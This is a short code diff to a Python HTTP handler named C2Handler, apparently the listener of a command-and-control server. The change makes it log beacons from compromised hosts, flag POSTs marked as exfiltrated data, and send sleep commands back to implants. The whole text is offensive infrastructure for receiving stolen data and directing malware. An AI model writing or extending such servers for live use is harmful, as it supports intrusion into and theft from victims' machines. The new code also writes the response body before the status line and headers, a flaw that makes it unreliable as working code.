@@ -21,12 +21,18 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
 
-        logging.info(f"BEACON RECEIVED: {self.client_address[0]} - {post_data.decode('utf-8', errors='ignore')}")
+        data_str = post_data.decode('utf-8', errors='ignore')
+
+        if "type=EXFIL" in data_str:
+             logging.info(f"🚨 EXFILTRATION DETECTED: {self.client_address[0]} - {data_str[:100]}...")
+             self.wfile.write(b"ACK_EXFIL")
+        else:
+             logging.info(f"BEACON RECEIVED: {self.client_address[0]} - {data_str}")
+             self.wfile.write(b"ACK_CMD:SLEEP")
 
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"ACK_CMD:SLEEP")
 
     def log_message(self, format, *args):
         return # Squelch stdout logging
